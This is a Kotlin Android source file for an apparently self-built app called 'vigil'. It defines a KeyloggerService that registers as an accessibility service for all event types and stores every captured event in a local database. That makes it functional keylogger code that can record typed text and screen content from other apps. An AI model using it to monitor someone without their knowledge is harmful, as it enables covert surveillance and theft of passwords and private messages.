package com.jackstoller.vigil

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.util.Date

class KeyloggerService : AccessibilityService() {

    private lateinit var db: EventLoggerDatabase

    override fun onServiceConnected() {
        super.onServiceConnected()

        db = EventLoggerDatabase(this)

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        }

        Log.d("VigilService", "Accessibility Service Connected!")
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        Log.d("VigilService", "Accessibility Event Captured. Logging to database.")
        db.insertEvent(event)
    }

    override fun onInterrupt() {
        // Handle service interruption
    }
}